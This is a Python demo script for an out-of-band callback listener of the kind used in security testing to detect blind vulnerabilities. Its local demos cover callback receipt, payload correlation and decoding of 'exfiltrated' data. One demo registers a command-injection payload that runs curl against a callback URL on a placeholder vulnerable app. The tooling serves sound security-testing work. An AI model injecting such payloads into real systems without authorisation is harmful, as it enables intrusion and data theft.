"""OOB Listener Demo

This demo shows how to use the OOB Listener for detecting blind vulnerabilities.
"""

import asyncio
import aiohttp
from app.core.oob_listener import OOBListener


async def demo_basic_callback():
    """Demo: Basic HTTP callback reception"""
    print("\n=== Demo 1: Basic HTTP Callback ===")

    # Initialize listener
    listener = OOBListener(http_port=18080, dns_port=15353, domain="localhost")
    await listener.start()

    try:
        # Generate unique ID
        unique_id = listener.generate_unique_id()
        callback_url = listener.get_callback_url(unique_id)

        print(f"Callback URL: {callback_url}")
        print("Waiting for callback...")

        # Simulate target making callback (in real scenario, this would be the exploited target)
        async def simulate_target():
            await asyncio.sleep(1)
            async with aiohttp.ClientSession() as session:
                await session.get(callback_url)

        asyncio.create_task(simulate_target())

        # Wait for callback
        callback = await listener.wait_for_callback(unique_id, timeout=5.0)

        if callback:
            print(f"✓ Callback received from {callback.source_ip}")
            print(f"  Type: {callback.callback_type}")
            print(f"  Timestamp: {callback.timestamp}")
        else:
            print("✗ No callback received")

    finally:
        await listener.stop()


async def demo_payload_correlation():
    """Demo: Payload registration and correlation"""
    print("\n=== Demo 2: Payload Correlation ===")

    listener = OOBListener(http_port=18081, dns_port=15354, domain="localhost")
    await listener.start()

    try:
        # Generate unique ID
        unique_id = listener.generate_unique_id()
        callback_url = listener.get_callback_url(unique_id)

        # Register payload
        await listener.register_payload(
            unique_id=unique_id,
            payload=f"curl {callback_url}",
            target_url="https://vulnerable-app.com/api/exec",
            injection_point="cmd",
            vulnerability_type="command_injection",
            metadata={"test_case": "blind_rce"},
        )

        print(f"Registered payload for command injection test")
        print(f"Callback URL: {callback_url}")

        # Simulate callback
        async def simulate_target():
            await asyncio.sleep(1)
            async with aiohttp.ClientSession() as session:
                await session.get(callback_url)

        asyncio.create_task(simulate_target())

        # Wait for callback
        callback = await listener.wait_for_callback(unique_id, timeout=5.0)

        if callback:
            # Correlate with payload
            payload_reg = listener.correlate_callback(callback)
            if payload_reg:
                print(f"✓ Callback correlated with payload!")
                print(f"  Vulnerability: {payload_reg.vulnerability_type}")
                print(f"  Target: {payload_reg.target_url}")
                print(f"  Injection Point: {payload_reg.injection_point}")
                print(f"  Payload: {payload_reg.payload}")

    finally:
        await listener.stop()


async def demo_data_exfiltration():
    """Demo: Automatic data decoding"""
    print("\n=== Demo 3: Data Exfiltration with Decoding ===")

    listener = OOBListener(http_port=18082, dns_port=15355, domain="localhost")
    await listener.start()

    try:
        # Test different encoding schemes
        test_cases = [
            ("Base64", "c2VjcmV0X2ZsYWd7dGVzdDEyM30="),  # "secret_flag{test123}"
            ("Hex", "666c61677b68657821323321237d"),  # "flag{hex!23!#}"
            ("URL", "flag%20with%20spaces"),  # "flag with spaces"
        ]

        for encoding_name, encoded_data in test_cases:
            unique_id = listener.generate_unique_id()
            callback_url = f"http://localhost:{listener.http_port}/{unique_id}?data={encoded_data}"

            print(f"\nTesting {encoding_name} encoding:")
            print(f"  Encoded: {encoded_data}")

            # Simulate callback with encoded data
            async with aiohttp.ClientSession() as session:
                await session.get(callback_url)

            await asyncio.sleep(0.2)

            # Get callback and check decoded data
            callbacks = listener.get_callbacks(unique_id)
            if callbacks:
                callback = callbacks[0]
                print(f"  Decoded: {callback.decoded_data}")

    finally:
        await listener.stop()


async def demo_multiple_concurrent():
    """Demo: Multiple concurrent OOB tests"""
    print("\n=== Demo 4: Multiple Concurrent Tests ===")

    listener = OOBListener(http_port=18083, dns_port=15356, domain="localhost")
    await listener.start()

    try:
        # Create multiple test scenarios
        test_scenarios = [
            ("sqli", "SQL Injection"),
            ("xxe", "XXE"),
            ("ssrf", "SSRF"),
            ("rce", "Command Injection"),
        ]

        tasks = []

        for vuln_type, vuln_name in test_scenarios:
            unique_id = listener.generate_unique_id()
            callback_url = listener.get_callback_url(unique_id)

            # Register payload
            await listener.register_payload(
                unique_id=unique_id,
                payload=f"test payload for {vuln_type}",
                target_url=f"https://target.com/api/{vuln_type}",
                injection_point="param",
                vulnerability_type=vuln_type,
            )

            # Simulate callback
            async def send_callback(url):
                await asyncio.sleep(0.5)
                async with aiohttp.ClientSession() as session:
                    await session.get(url)

            tasks.append(send_callback(callback_url))

        # Send all callbacks concurrently
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.5)

        # Check all correlations
        print("\nReceived callbacks:")
        correlations = listener.get_all_correlations()
        for payload_reg, callbacks in correlations:
            if callbacks:
                print(
                    f"  ✓ {payload_reg.vulnerability_type}: "
                    f"{len(callbacks)} callback(s) from {callbacks[0].source_ip}"
                )

    finally:
        await listener.stop()


async def demo_streaming():
    """Demo: Real-time callback streaming"""
    print("\n=== Demo 5: Real-time Callback Streaming ===")

    listener = OOBListener(http_port=18084, dns_port=15357, domain="localhost")
    await listener.start()

    try:
        print("Starting callback stream (will receive 3 callbacks)...")

        # Start streaming in background
        callback_count = 0

        async def stream_callbacks():
            nonlocal callback_count
            async for callback in listener.stream_callbacks():
                callback_count += 1
                print(
                    f"  [{callback_count}] Received {callback.callback_type} "
                    f"callback from {callback.source_ip}"
                )
                if callback_count >= 3:
                    break

        stream_task = asyncio.create_task(stream_callbacks())

        # Send some callbacks
        for i in range(3):
            await asyncio.sleep(0.5)
            unique_id = listener.generate_unique_id()
            callback_url = listener.get_callback_url(unique_id)
            async with aiohttp.ClientSession() as session:
                await session.get(callback_url)

        # Wait for streaming to complete
        await stream_task

    finally:
        await listener.stop()


async def main():
    """Run all demos"""
    print("=" * 60)
    print("OOB Listener Demo")
    print("=" * 60)

    demos = [
        demo_basic_callback,
        demo_payload_correlation,
        demo_data_exfiltration,
        demo_multiple_concurrent,
        demo_streaming,
    ]

    for demo in demos:
        try:
            await demo()
        except Exception as e:
            print(f"Error in demo: {e}")

    print("\n" + "=" * 60)
    print("All demos completed!")
    print("=" * 60)


if __name__ == "__main__":
    asyncio.run(main())
